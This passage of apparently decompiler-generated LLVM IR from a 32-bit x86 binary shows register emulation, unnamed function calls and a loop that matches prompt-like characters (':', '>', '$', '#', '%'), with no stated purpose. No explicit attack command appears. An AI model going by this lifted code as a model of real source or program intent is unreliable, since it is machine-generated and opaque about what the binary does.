  %v0_804e67e = phi i32 [ %v1_804e669, %dec_label_pc_804e670 ], [ %v0_804e669, %dec_label_pc_804e65a ]
  %v1_804e67e = add i32 %v0_804e67e, 1
  store i32 %v1_804e67e, i32* @esi, align 4
  %v10_804e681 = icmp eq i32 %v0_804e67e, -2
  br i1 %v10_804e681, label %dec_label_pc_804e415.backedge, label %dec_label_pc_804e68a

dec_label_pc_804e68a:                             ; preds = %dec_label_pc_804e67e.thread, %dec_label_pc_804e67e
  %v1_804e67e176 = phi i32 [ %v3_804e640, %dec_label_pc_804e67e.thread ], [ %v1_804e67e, %dec_label_pc_804e67e ]
  %tmp136 = icmp slt i32 %v1_804e67e176, 1
  br i1 %tmp136, label %dec_label_pc_804ea89, label %dec_label_pc_804e692

dec_label_pc_804e692:                             ; preds = %dec_label_pc_804e68a
  %v0_804e692 = load i32, i32* @esp, align 4
  %v1_804e695 = add i32 %v0_804e692, -16
  %v2_804e695 = inttoptr i32 %v1_804e695 to i32*
  store i32 6, i32* %v2_804e695, align 4
  %v0_804e697 = call i32 @function_804f150()
  store i32 %v0_804e697, i32* %eax.global-to-local, align 4
  %v0_804e69c = load i32, i32* @esp, align 4
  %v1_804e69c = inttoptr i32 %v0_804e69c to i32*
  %v2_804e69c = load i32, i32* %v1_804e69c, align 4
  store i32 %v2_804e69c, i32* %eax.global-to-local, align 4
  %v3_804e69c = add i32 %v0_804e69c, 4
  %v1_804e69d = inttoptr i32 %v3_804e69c to i32*
  %v2_804e69d = load i32, i32* %v1_804e69d, align 4
  store i32 %v2_804e69d, i32* %edx.global-to-local, align 4
  %v1_804e69e = add i32 %v0_804e69c, 1872
  store i32 %v1_804e69e, i32* %eax.global-to-local, align 4
  store i32 %v1_804e69e, i32* %v1_804e69d, align 4
  store i32 6, i32* %v1_804e69c, align 4
  %v0_804e6a8 = call i32 @function_804f0a0()
  store i32 %v0_804e6a8, i32* %eax.global-to-local, align 4
  %v0_804e6ad = load i32, i32* @esp, align 4
  %v1_804e6ad = add i32 %v0_804e6ad, -4
  %v2_804e6ad = inttoptr i32 %v1_804e6ad to i32*
  store i32 16384, i32* %v2_804e6ad, align 4
  %v1_804e6b2 = add i32 %v0_804e6ad, 1872
  %v2_804e6b2 = inttoptr i32 %v1_804e6b2 to i32*
  %v3_804e6b2 = load i32, i32* %v2_804e6b2, align 4
  %v2_804e6b9 = add i32 %v0_804e6ad, -8
  %v3_804e6b9 = inttoptr i32 %v2_804e6b9 to i32*
  store i32 %v3_804e6b2, i32* %v3_804e6b9, align 4
  %v2_804e6ba = add i32 %v0_804e6ad, -12
  %v3_804e6ba = inttoptr i32 %v2_804e6ba to i32*
  store i32 %v0_804e6a8, i32* %v3_804e6ba, align 4
  %v0_804e6bb = load i32, i32* @edi, align 4
  %v1_804e6bb = add i32 %v0_804e6bb, 4
  %v2_804e6bb = inttoptr i32 %v1_804e6bb to i32*
  %v3_804e6bb = load i32, i32* %v2_804e6bb, align 4
  store i32 %v3_804e6bb, i32* @ebx, align 4
  %v2_804e6be = add i32 %v0_804e6ad, -16
  %v3_804e6be = inttoptr i32 %v2_804e6be to i32*
  store i32 %v3_804e6bb, i32* %v3_804e6be, align 4
  %v0_804e6bf = call i32 @function_80501e6()
  store i32 %v0_804e6bf, i32* %eax.global-to-local, align 4
  %v0_804e6c4 = load i32, i32* @esp, align 4
  %v1_804e6c7 = add i32 %v0_804e6c4, 28
  %v2_804e6c7 = inttoptr i32 %v1_804e6c7 to i32*
  store i32 16384, i32* %v2_804e6c7, align 4
  %v1_804e6cc = add i32 %v0_804e6c4, 24
  %v2_804e6cc = inttoptr i32 %v1_804e6cc to i32*
  store i32 2, i32* %v2_804e6cc, align 4
  %v1_804e6ce = add i32 %v0_804e6c4, 20
  %v2_804e6ce = inttoptr i32 %v1_804e6ce to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80523f9.22 to i32), i32* %v2_804e6ce, align 4
  %v0_804e6d3 = load i32, i32* @edi, align 4
  %v1_804e6d3 = add i32 %v0_804e6d3, 4
  %v2_804e6d3 = inttoptr i32 %v1_804e6d3 to i32*
  %v3_804e6d3 = load i32, i32* %v2_804e6d3, align 4
  store i32 %v3_804e6d3, i32* %ecx.global-to-local, align 4
  %v2_804e6d6 = add i32 %v0_804e6c4, 16
  %v3_804e6d6 = inttoptr i32 %v2_804e6d6 to i32*
  store i32 %v3_804e6d3, i32* %v3_804e6d6, align 4
  %v0_804e6d7 = call i32 @function_80501e6()
  store i32 %v0_804e6d7, i32* %eax.global-to-local, align 4
  %v0_804e6dc = load i32, i32* @esp, align 4
  %v1_804e6dc = inttoptr i32 %v0_804e6dc to i32*
  store i32 6, i32* %v1_804e6dc, align 4
  %v0_804e6e3 = call i32 @function_804f0d0()
  store i32 %v0_804e6e3, i32* %eax.global-to-local, align 4
  %v0_804e6eb = load i32, i32* @edi, align 4
  %v1_804e6eb = add i32 %v0_804e6eb, 12
  %v2_804e6eb = inttoptr i32 %v1_804e6eb to i32*
  store i32 7, i32* %v2_804e6eb, align 4
  br label %dec_label_pc_804e778

dec_label_pc_804e6f7:                             ; preds = %dec_label_pc_804e487
  %v0_804e6f7 = load i32, i32* @esp, align 4
  %v1_804e6fa = add i32 %v0_804e6f7, -16
  %v2_804e6fa = inttoptr i32 %v1_804e6fa to i32*
  store i32 10, i32* %v2_804e6fa, align 4
  %v0_804e6fc = call i32 @function_804f150()
  store i32 %v0_804e6fc, i32* %eax.global-to-local, align 4
  %v0_804e701 = load i32, i32* @esp, align 4
  %v1_804e701 = inttoptr i32 %v0_804e701 to i32*
  %v2_804e701 = load i32, i32* %v1_804e701, align 4
  store i32 %v2_804e701, i32* %eax.global-to-local, align 4
  %v3_804e701 = add i32 %v0_804e701, 4
  %v1_804e702 = inttoptr i32 %v3_804e701 to i32*
  %v2_804e702 = load i32, i32* %v1_804e702, align 4
  store i32 %v2_804e702, i32* %edx.global-to-local, align 4
  %v1_804e703 = add i32 %v0_804e701, 1864
  store i32 %v1_804e703, i32* %ecx.global-to-local, align 4
  store i32 %v1_804e703, i32* %v1_804e702, align 4
  store i32 10, i32* %v1_804e701, align 4
  %v0_804e70d = call i32 @function_804f0a0()
  store i32 %v0_804e70d, i32* %eax.global-to-local, align 4
  %v0_804e712 = load i32, i32* @esp, align 4
  %v1_804e712 = add i32 %v0_804e712, 1864
  %v2_804e712 = inttoptr i32 %v1_804e712 to i32*
  %v3_804e712 = load i32, i32* %v2_804e712, align 4
  %v1_804e719 = add i32 %v3_804e712, -1
  store i32 %v1_804e719, i32* %edx.global-to-local, align 4
  %v2_804e71a = add i32 %v0_804e712, -4
  %v3_804e71a = inttoptr i32 %v2_804e71a to i32*
  store i32 %v1_804e719, i32* %v3_804e71a, align 4
  %v2_804e71b = add i32 %v0_804e712, -8
  %v3_804e71b = inttoptr i32 %v2_804e71b to i32*
  store i32 %v0_804e70d, i32* %v3_804e71b, align 4
  %v0_804e71c = load i32, i32* @edi, align 4
  %v1_804e71c = add i32 %v0_804e71c, 24
  %v2_804e71c = inttoptr i32 %v1_804e71c to i32*
  %v3_804e71c = load i32, i32* %v2_804e71c, align 4
  store i32 %v3_804e71c, i32* %eax.global-to-local, align 4
  %v2_804e71f = add i32 %v0_804e712, -12
  %v3_804e71f = inttoptr i32 %v2_804e71f to i32*
  store i32 %v3_804e71c, i32* %v3_804e71f, align 4
  %v1_804e720 = add i32 %v0_804e712, 24
  %v2_804e720 = inttoptr i32 %v1_804e720 to i32*
  %v3_804e720 = load i32, i32* %v2_804e720, align 4
  store i32 %v3_804e720, i32* %eax.global-to-local, align 4
  %v2_804e724 = add i32 %v0_804e712, -16
  %v3_804e724 = inttoptr i32 %v2_804e724 to i32*
  store i32 %v3_804e720, i32* %v3_804e724, align 4
  %v0_804e725 = call i32 @function_804f640()
  %v0_804e72a = load i32, i32* @esp, align 4
  %v1_804e72d = add i32 %v0_804e725, 1
  %v8_804e72d = icmp eq i32 %v1_804e72d, 0
  store i32 %v1_804e72d, i32* %eax.global-to-local, align 4
  %v1_804ec30 = add i32 %v0_804e72a, 16
  %v2_804ec30 = inttoptr i32 %v1_804ec30 to i32*
  store i32 10, i32* %v2_804ec30, align 4
  %v0_804ec32 = call i32 @function_804f0d0()
  store i32 %v0_804ec32, i32* %eax.global-to-local, align 4
  %v0_804ec37 = load i32, i32* @esp, align 4
  %v1_804ec37 = inttoptr i32 %v0_804ec37 to i32*
  br i1 %v8_804e72d, label %dec_label_pc_804ec2d, label %dec_label_pc_804e734

dec_label_pc_804e734:                             ; preds = %dec_label_pc_804e6f7
  %v2_804e73e = load i32, i32* %v1_804ec37, align 4
  store i32 %v2_804e73e, i32* %eax.global-to-local, align 4
  %v0_804e73f = load i32, i32* @edi, align 4
  %v1_804e73f = add i32 %v0_804e73f, 4
  %v2_804e73f = inttoptr i32 %v1_804e73f to i32*
  %v3_804e73f = load i32, i32* %v2_804e73f, align 4
  store i32 %v3_804e73f, i32* %eax.global-to-local, align 4
  store i32 %v3_804e73f, i32* %v1_804ec37, align 4
  %v1_804e743 = call i32 @function_804fab3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e743, i32* %eax.global-to-local, align 4
  %v0_804e748 = load i32, i32* @edi, align 4
  %v1_804e748 = add i32 %v0_804e748, 284
  %v2_804e748 = inttoptr i32 %v1_804e748 to i8*
  %v3_804e748 = load i8, i8* %v2_804e748, align 1
  %v4_804e748 = zext i8 %v3_804e748 to i32
  %v6_804e748 = and i32 %v1_804e743, -256
  %v7_804e748 = or i32 %v4_804e748, %v6_804e748
  %v1_804e751 = add i32 %v7_804e748, 1
  store i32 %v1_804e751, i32* %eax.global-to-local, align 4
  %v1_804e752 = add i32 %v0_804e748, 4
  %v2_804e752 = inttoptr i32 %v1_804e752 to i32*
  store i32 -1, i32* %v2_804e752, align 4
  %v0_804e759 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e759 = trunc i32 %v0_804e759 to i8
  %v2_804e759 = load i32, i32* @edi, align 4
  %v3_804e759 = add i32 %v2_804e759, 284
  %v4_804e759 = inttoptr i32 %v3_804e759 to i8*
  store i8 %v1_804e759, i8* %v4_804e759, align 1
  %v0_804e75f = load i32, i32* %eax.global-to-local, align 4
  %v1_804e75f = trunc i32 %v0_804e75f to i8
  %v10_804e75f = icmp eq i8 %v1_804e75f, 10
  %v1_804e761 = icmp eq i1 %v10_804e75f, false
  %v0_804efed = load i32, i32* @edi, align 4
  br i1 %v1_804e761, label %dec_label_pc_804efed, label %dec_label_pc_804e767

dec_label_pc_804e767:                             ; preds = %dec_label_pc_804e734
  %v1_804e767 = add i32 %v0_804efed, 284
  %v2_804e767 = inttoptr i32 %v1_804e767 to i8*
  store i8 0, i8* %v2_804e767, align 1
  %v0_804e76e = load i32, i32* @edi, align 4
  %v1_804e76e = add i32 %v0_804e76e, 12
  %v2_804e76e = inttoptr i32 %v1_804e76e to i32*
  store i32 0, i32* %v2_804e76e, align 4
  store i32 -1, i32* @esi, align 4
  br label %dec_label_pc_804e778

dec_label_pc_804e778:                             ; preds = %dec_label_pc_804ea89, %dec_label_pc_804e83a, %dec_label_pc_804ed71, %dec_label_pc_804efed, %dec_label_pc_804ecb0, %dec_label_pc_804e692, %dec_label_pc_804eaa6, %dec_label_pc_804ecf8, %dec_label_pc_804ea4b, %dec_label_pc_804e51e, %dec_label_pc_804ebd5, %dec_label_pc_804e767
  %v0_804e778 = load i32, i32* @edi, align 4
  %v1_804e778 = add i32 %v0_804e778, 24
  %v2_804e778 = inttoptr i32 %v1_804e778 to i32*
  %v3_804e778 = load i32, i32* %v2_804e778, align 4
  store i32 %v3_804e778, i32* %edx.global-to-local, align 4
  store i32 %v3_804e778, i32* %eax.global-to-local, align 4
  %v1_804e77d = load i32, i32* @esi, align 4
  %v2_804e77d = sub i32 %v3_804e778, %v1_804e77d
  %v8_804e77d = xor i32 %v1_804e77d, %v3_804e778
  %v9_804e77d = xor i32 %v2_804e77d, %v3_804e778
  %v10_804e77d = and i32 %v9_804e77d, %v8_804e77d
  %v11_804e77d = icmp slt i32 %v10_804e77d, 0
  %v12_804e77d = icmp eq i32 %v2_804e77d, 0
  %v13_804e77d = icmp slt i32 %v2_804e77d, 0
  %v3_804e77f = icmp ne i1 %v13_804e77d, %v11_804e77d
  %v4_804e77f = or i1 %v12_804e77d, %v3_804e77f
  br i1 %v4_804e77f, label %dec_label_pc_804e783, label %dec_label_pc_804e781

dec_label_pc_804e781:                             ; preds = %dec_label_pc_804e778
  store i32 %v1_804e77d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e783

dec_label_pc_804e783:                             ; preds = %dec_label_pc_804e778, %dec_label_pc_804e781
  %v1_804e783 = phi i32 [ %v3_804e778, %dec_label_pc_804e778 ], [ %v1_804e77d, %dec_label_pc_804e781 ]
  %v2_804e783 = sub i32 %v3_804e778, %v1_804e783
  store i32 %v2_804e783, i32* %eax.global-to-local, align 4
  store i32 %v2_804e783, i32* %v2_804e778, align 4
  %v0_804e788 = load i32, i32* @ebx, align 4
  %v1_804e788 = load i32, i32* @esp, align 4
  %v2_804e788 = add i32 %v1_804e788, -4
  %v3_804e788 = inttoptr i32 %v2_804e788 to i32*
  store i32 %v0_804e788, i32* %v3_804e788, align 4
  %v0_804e789 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e789 = add i32 %v1_804e788, -8
  %v3_804e789 = inttoptr i32 %v2_804e789 to i32*
  store i32 %v0_804e789, i32* %v3_804e789, align 4
  %v1_804e78a = add i32 %v1_804e788, 8
  %v2_804e78a = inttoptr i32 %v1_804e78a to i32*
  %v3_804e78a = load i32, i32* %v2_804e78a, align 4
  %v1_804e78e = load i32, i32* %edx.global-to-local, align 4
  %v2_804e78e = add i32 %v1_804e78e, %v3_804e78a
  store i32 %v2_804e78e, i32* %eax.global-to-local, align 4
  %v2_804e790 = add i32 %v1_804e788, -12
  %v3_804e790 = inttoptr i32 %v2_804e790 to i32*
  store i32 %v2_804e78e, i32* %v3_804e790, align 4
  %v3_804e791 = load i32, i32* %v2_804e78a, align 4
  store i32 %v3_804e791, i32* %ecx.global-to-local, align 4
  %v2_804e795 = add i32 %v1_804e788, -16
  %v3_804e795 = inttoptr i32 %v2_804e795 to i32*
  store i32 %v3_804e791, i32* %v3_804e795, align 4
  %v4_804e796 = call i32 @function_8050015(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e796, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e487

dec_label_pc_804e7a3:                             ; preds = %dec_label_pc_804e487
  %v1_804e7a3 = add i32 %v0_804e487, 24
  %v2_804e7a3 = inttoptr i32 %v1_804e7a3 to i32*
  %v3_804e7a3 = load i32, i32* %v2_804e7a3, align 4
  %v1_804e7a6 = add i32 %v3_804e7a3, -1
  store i32 %v1_804e7a6, i32* %eax.global-to-local, align 4
  %tmp137 = icmp slt i32 %v1_804e7a6, 1
  br i1 %tmp137, label %dec_label_pc_804e415.backedge, label %dec_label_pc_804e7af.preheader

dec_label_pc_804e7af.preheader:                   ; preds = %dec_label_pc_804e7a3
  %v7_804e7af.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_804e7af = add i32 %v0_804e487, 28
  br label %dec_label_pc_804e7af

dec_label_pc_804e7af:                             ; preds = %dec_label_pc_804e7af.preheader, %dec_label_pc_804e7e0
  %v7_804e7af = phi i32 [ %v7_804e7af.pre, %dec_label_pc_804e7af.preheader ], [ %v9_804e7af, %dec_label_pc_804e7e0 ]
  %v0_804ed5d = phi i32 [ %v1_804e7a6, %dec_label_pc_804e7af.preheader ], [ %v1_804e7e0, %dec_label_pc_804e7e0 ]
  %v3_804e7af = add i32 %v2_804e7af, %v0_804ed5d
  %v4_804e7af = inttoptr i32 %v3_804e7af to i8*
  %v5_804e7af = load i8, i8* %v4_804e7af, align 1
  %v6_804e7af = zext i8 %v5_804e7af to i32
  %v8_804e7af = and i32 %v7_804e7af, -256
  %v9_804e7af = or i32 %v6_804e7af, %v8_804e7af
  store i32 %v9_804e7af, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e7af, label %dec_label_pc_804e7e0 [
    i8 58, label %dec_label_pc_804ed5d
    i8 62, label %dec_label_pc_804ed5d
    i8 36, label %dec_label_pc_804ed5d
    i8 35, label %dec_label_pc_804ed5d
    i8 37, label %dec_label_pc_804ed5d
  ]

dec_label_pc_804e7e0:                             ; preds = %dec_label_pc_804e7af
  %v1_804e7e0 = add i32 %v0_804ed5d, -1
  %v8_804e7e0 = icmp eq i32 %v1_804e7e0, 0
  store i32 %v1_804e7e0, i32* %eax.global-to-local, align 4
  %v1_804e7e1 = icmp eq i1 %v8_804e7e0, false
  br i1 %v1_804e7e1, label %dec_label_pc_804e7af, label %dec_label_pc_804e415.backedge

dec_label_pc_804e7e8:                             ; preds = %dec_label_pc_804e487
  %v1_804e7e8 = add i32 %v0_804e487, 24
  %v2_804e7e8 = inttoptr i32 %v1_804e7e8 to i32*
  %v3_804e7e8 = load i32, i32* %v2_804e7e8, align 4
  %v1_804e7eb = add i32 %v3_804e7e8, -1
  store i32 %v1_804e7eb, i32* %eax.global-to-local, align 4
  %tmp138 = icmp slt i32 %v1_804e7eb, 1
  br i1 %tmp138, label %dec_label_pc_804e415.backedge, label %dec_label_pc_804e7f4

dec_label_pc_804e7f4:                             ; preds = %dec_label_pc_804e7e8
  %v2_804e7f4 = add i32 %v0_804e487, 27
  %v3_804e7f4 = add i32 %v2_804e7f4, %v3_804e7e8
  %v4_804e7f4 = inttoptr i32 %v3_804e7f4 to i8*
  %v5_804e7f4 = load i8, i8* %v4_804e7f4, align 1
  %v6_804e7f4 = zext i8 %v5_804e7f4 to i32
  %v7_804e7f4 = load i32, i32* %edx.global-to-local, align 4
  %v8_804e7f4 = and i32 %v7_804e7f4, -256
  %v9_804e7f4 = or i32 %v8_804e7f4, %v6_804e7f4
  store i32 %v9_804e7f4, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e7f4, label %dec_label_pc_804e802 [
    i8 62, label %dec_label_pc_804e826.thread
    i8 58, label %dec_label_pc_804e826.thread
  ]

dec_label_pc_804e802:                             ; preds = %dec_label_pc_804e7f4, %dec_label_pc_804e818
  %v0_804e811 = phi i32 [ %v1_804e811, %dec_label_pc_804e818 ], [ %v1_804e7eb, %dec_label_pc_804e7f4 ]
  %v7_804e818 = phi i32 [ %v9_804e818, %dec_label_pc_804e818 ], [ %v9_804e7f4, %dec_label_pc_804e7f4 ]
  %v1_804e802 = trunc i32 %v7_804e818 to i8
  %v1_804e802.off = add i8 %v1_804e802, -35
  %switch168 = icmp ult i8 %v1_804e802.off, 3
  br i1 %switch168, label %dec_label_pc_804e826, label %dec_label_pc_804e811

dec_label_pc_804e811:                             ; preds = %dec_label_pc_804e802
  %v1_804e811 = add i32 %v0_804e811, -1
  %v8_804e811 = icmp eq i32 %v1_804e811, 0
  store i32 %v1_804e811, i32* %eax.global-to-local, align 4
  br i1 %v8_804e811, label %dec_label_pc_804e415.backedge, label %dec_label_pc_804e818

dec_label_pc_804e818:                             ; preds = %dec_label_pc_804e811
  %v3_804e818 = add i32 %v2_804e7f4, %v0_804e811
  %v4_804e818 = inttoptr i32 %v3_804e818 to i8*
  %v5_804e818 = load i8, i8* %v4_804e818, align 1
  %v6_804e818 = zext i8 %v5_804e818 to i32
  %v8_804e818 = and i32 %v7_804e818, -256
  %v9_804e818 = or i32 %v6_804e818, %v8_804e818
  store i32 %v9_804e818, i32* %edx.global-to-local, align 4
  %v10_804e81c = icmp ne i8 %v5_804e818, 58
  %v10_804e821 = icmp eq i8 %v5_804e818, 62
  %v1_804e824 = icmp eq i1 %v10_804e821, false
  %or.cond166 = and i1 %v10_804e81c, %v1_804e824
  br i1 %or.cond166, label %dec_label_pc_804e802, label %dec_label_pc_804e826

dec_label_pc_804e826.thread:                      ; preds = %dec_label_pc_804e7f4, %dec_label_pc_804e7f4
  store i32 %v3_804e7e8, i32* @esi, align 4
  br label %dec_label_pc_804e832

dec_label_pc_804e826:                             ; preds = %dec_label_pc_804e802, %dec_label_pc_804e818
  %v0_804e826 = phi i32 [ %v1_804e811, %dec_label_pc_804e818 ], [ %v0_804e811, %dec_label_pc_804e802 ]
  %v1_804e826 = add i32 %v0_804e826, 1
  store i32 %v1_804e826, i32* @esi, align 4
  %v10_804e829 = icmp eq i32 %v0_804e826, -2
  br i1 %v10_804e829, label %dec_label_pc_804e415.backedge, label %dec_label_pc_804e832

dec_label_pc_804e832:                             ; preds = %dec_label_pc_804e826.thread, %dec_label_pc_804e826
  %v1_804e826179 = phi i32 [ %v3_804e7e8, %dec_label_pc_804e826.thread ], [ %v1_804e826, %dec_label_pc_804e826 ]
  %tmp139 = icmp slt i32 %v1_804e826179, 1
  br i1 %tmp139, label %dec_label_pc_804ea89, label %dec_label_pc_804e83a

dec_label_pc_804e83a:                             ; preds = %dec_label_pc_804e832
  %v0_804e83a = load i32, i32* @esp, align 4
  %v1_804e83d = add i32 %v0_804e83a, -16
  %v2_804e83d = inttoptr i32 %v1_804e83d to i32*
  store i32 8, i32* %v2_804e83d, align 4
  %v0_804e83f = call i32 @function_804f150()
  store i32 %v0_804e83f, i32* %eax.global-to-local, align 4
  %v0_804e844 = load i32, i32* @esp, align 4
  %v1_804e844 = inttoptr i32 %v0_804e844 to i32*
  %v2_804e844 = load i32, i32* %v1_804e844, align 4
  store i32 %v2_804e844, i32* %eax.global-to-local, align 4
  %v3_804e844 = add i32 %v0_804e844, 4
  %v1_804e845 = inttoptr i32 %v3_804e844 to i32*
  %v1_804e846 = add i32 %v0_804e844, 1864
  store i32 %v1_804e846, i32* %edx.global-to-local, align 4
  store i32 %v1_804e846, i32* %v1_804e845, align 4
  store i32 8, i32* %v1_804e844, align 4
  %v0_804e850 = call i32 @function_804f0a0()
  store i32 %v0_804e850, i32* %eax.global-to-local, align 4
  %v0_804e855 = load i32, i32* @esp, align 4
  %v1_804e855 = add i32 %v0_804e855, -4
  %v2_804e855 = inttoptr i32 %v1_804e855 to i32*
  store i32 16384, i32* %v2_804e855, align 4
  %v1_804e85a = add i32 %v0_804e855, 1864
  %v2_804e85a = inttoptr i32 %v1_804e85a to i32*
  %v3_804e85a = load i32, i32* %v2_804e85a, align 4
  %v2_804e861 = add i32 %v0_804e855, -8
  %v3_804e861 = inttoptr i32 %v2_804e861 to i32*
  store i32 %v3_804e85a, i32* %v3_804e861, align 4
  %v2_804e862 = add i32 %v0_804e855, -12
  %v3_804e862 = inttoptr i32 %v2_804e862 to i32*
  store i32 %v0_804e850, i32* %v3_804e862, align 4
  %v0_804e863 = load i32, i32* @edi, align 4
  %v1_804e863 = add i32 %v0_804e863, 4
  %v2_804e863 = inttoptr i32 %v1_804e863 to i32*
  %v3_804e863 = load i32, i32* %v2_804e863, align 4
  store i32 %v3_804e863, i32* @ebx, align 4
  %v2_804e866 = add i32 %v0_804e855, -16
  %v3_804e866 = inttoptr i32 %v2_804e866 to i32*
  store i32 %v3_804e863, i32* %v3_804e866, align 4
  %v0_804e867 = call i32 @function_80501e6()
  store i32 %v0_804e867, i32* %eax.global-to-local, align 4
  %v0_804e86c = load i32, i32* @esp, align 4
  %v1_804e86f = add i32 %v0_804e86c, 28
  %v2_804e86f = inttoptr i32 %v1_804e86f to i32*
  store i32 16384, i32* %v2_804e86f, align 4
  %v1_804e874 = add i32 %v0_804e86c, 24
  %v2_804e874 = inttoptr i32 %v1_804e874 to i32*
  store i32 2, i32* %v2_804e874, align 4
  %v1_804e876 = add i32 %v0_804e86c, 20
  %v2_804e876 = inttoptr i32 %v1_804e876 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80523f9.22 to i32), i32* %v2_804e876, align 4
  %v0_804e87b = load i32, i32* @edi, align 4
  %v1_804e87b = add i32 %v0_804e87b, 4
  %v2_804e87b = inttoptr i32 %v1_804e87b to i32*
  %v3_804e87b = load i32, i32* %v2_804e87b, align 4
  store i32 %v3_804e87b, i32* %ecx.global-to-local, align 4
  %v2_804e87e = add i32 %v0_804e86c, 16
  %v3_804e87e = inttoptr i32 %v2_804e87e to i32*
  store i32 %v3_804e87b, i32* %v3_804e87e, align 4
  %v0_804e87f = call i32 @function_80501e6()
  store i32 %v0_804e87f, i32* %eax.global-to-local, align 4
  %v0_804e884 = load i32, i32* @esp, align 4
  %v1_804e884 = inttoptr i32 %v0_804e884 to i32*
  store i32 8, i32* %v1_804e884, align 4
  %v0_804e88b = call i32 @function_804f0d0()
  store i32 %v0_804e88b, i32* %eax.global-to-local, align 4
  %v0_804e893 = load i32, i32* @edi, align 4
  %v1_804e893 = add i32 %v0_804e893, 12
  %v2_804e893 = inttoptr i32 %v1_804e893 to i32*
  store i32 10, i32* %v2_804e893, align 4
  br label %dec_label_pc_804e778

dec_label_pc_804e89f:                             ; preds = %dec_label_pc_804e4b6
  %v1_804e89f = add i32 %v0_804e4a4, 2
  store i32 %v1_804e89f, i32* @ebx, align 4
  %v1_804e8a2 = add i32 %v0_804e8a2, 2
  store i32 %v1_804e8a2, i32* @esi, align 4
  br label %dec_label_pc_804e4a0.backedge

dec_label_pc_804e4a0.backedge:                    ; preds = %dec_label_pc_804e89f, %dec_label_pc_804ef9a
  %v0_804e51e120 = phi i32 [ %v0_804e51e121, %dec_label_pc_804e89f ], [ %v0_804efd3, %dec_label_pc_804ef9a ]
  %v1_804e4a0 = phi i32 [ %v1_804e4b0, %dec_label_pc_804e89f ], [ %v3_804efd3, %dec_label_pc_804ef9a ]
  %v0_804e4a0 = phi i32 [ %v1_804e8a2, %dec_label_pc_804e89f ], [ %v0_804e4a0.pre, %dec_label_pc_804ef9a ]
  %v5_804e4b6109 = phi i32 [ %v7_804e4b6, %dec_label_pc_804e89f ], [ %v0_804efcb, %dec_label_pc_804ef9a ]
  %v0_804e4a9104 = phi i32 [ %v0_804e918, %dec_label_pc_804e89f ], [ %v1_804efd0, %dec_label_pc_804ef9a ]
  %v2_804e4a0 = sub i32 %v0_804e4a0, %v1_804e4a0
  %v8_804e4a0 = xor i32 %v0_804e4a0, %v1_804e4a0
  %v9_804e4a0 = xor i32 %v2_804e4a0, %v0_804e4a0
  %v10_804e4a0 = and i32 %v9_804e4a0, %v8_804e4a0
  %v11_804e4a0 = icmp slt i32 %v10_804e4a0, 0
  %v13_804e4a0 = icmp slt i32 %v2_804e4a0, 0
  %v2_804e4a2 = icmp eq i1 %v13_804e4a0, %v11_804e4a0
  br i1 %v2_804e4a2, label %dec_label_pc_804e516, label %dec_label_pc_804e4a4.preheader

dec_label_pc_804e8aa:                             ; preds = %dec_label_pc_804e4e2
  store i8 -4, i8* %v2_804e4e2, align 1
  br label %dec_label_pc_804e4f5

dec_label_pc_804e8b3:                             ; preds = %dec_label_pc_804e430
  %v1_804e45d = icmp eq i32 %v0_804e455, 0
  br i1 %v1_804e45d, label %dec_label_pc_804ef6f, label %dec_label_pc_804e8b9

dec_label_pc_804e8b9:                             ; preds = %dec_label_pc_804e8b3
  %v10_804e8b9 = icmp eq i32 %v0_804e455, -1
  %v1_804e8bc = icmp eq i1 %v10_804e8b9, false
  br i1 %v1_804e8bc, label %dec_label_pc_804e477, label %dec_label_pc_804e8c2

dec_label_pc_804e8c2:                             ; preds = %dec_label_pc_804e8b9
  %v1_804e8c2 = add i32 %v0_804e45a, 40
  %v2_804e8c2 = inttoptr i32 %v1_804e8c2 to i32*
  %v3_804e8c2 = load i32, i32* %v2_804e8c2, align 4
  store i32 %v3_804e8c2, i32* %edx.global-to-local, align 4
  %v1_804e8c6 = inttoptr i32 %v3_804e8c2 to i32*
  %v2_804e8c6 = load i32, i32* %v1_804e8c6, align 4
  %v11_804e8c6 = icmp eq i32 %v2_804e8c6, 11
  br i1 %v11_804e8c6, label %dec_label_pc_804e3b2, label %dec_label_pc_804e8cf

dec_label_pc_804e8cf:                             ; preds = %dec_label_pc_804e8c2, %dec_label_pc_804ef6f
  %v0_804e8cf = phi i32 [ %v1_804e45a, %dec_label_pc_804e8c2 ], [ %v0_804e8cf.pre, %dec_label_pc_804ef6f ]
  %v0_804e8d2 = load i32, i32* @edi, align 4
  %v1_804e8d2 = add i32 %v0_804e8d2, 4
  %v2_804e8d2 = inttoptr i32 %v1_804e8d2 to i32*
  %v3_804e8d2 = load i32, i32* %v2_804e8d2, align 4
  store i32 %v3_804e8d2, i32* %ecx.global-to-local, align 4
  %v2_804e8d5 = add i32 %v0_804e8cf, -16
  %v3_804e8d5 = inttoptr i32 %v2_804e8d5 to i32*
  store i32 %v3_804e8d2, i32* %v3_804e8d5, align 4
  %v1_804e8d6 = call i32 @function_804fab3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e8d6, i32* %eax.global-to-local, align 4
  %v0_804e8db = load i32, i32* @edi, align 4
  %v1_804e8db = add i32 %v0_804e8db, 284
  %v2_804e8db = inttoptr i32 %v1_804e8db to i8*
  %v3_804e8db = load i8, i8* %v2_804e8db, align 1
  %v4_804e8db = zext i8 %v3_804e8db to i32
  %v6_804e8db = and i32 %v1_804e8d6, -256
  %v7_804e8db = or i32 %v4_804e8db, %v6_804e8db
  %v1_804e8e4 = add i32 %v7_804e8db, 1
  store i32 %v1_804e8e4, i32* %eax.global-to-local, align 4
  %v1_804e8e5 = add i32 %v0_804e8db, 4
  %v2_804e8e5 = inttoptr i32 %v1_804e8e5 to i32*
  store i32 -1, i32* %v2_804e8e5, align 4
  %v0_804e8ec = load i32, i32* %eax.global-to-local, align 4
  %v1_804e8ec = trunc i32 %v0_804e8ec to i8
  %v2_804e8ec = load i32, i32* @edi, align 4
  %v3_804e8ec = add i32 %v2_804e8ec, 284
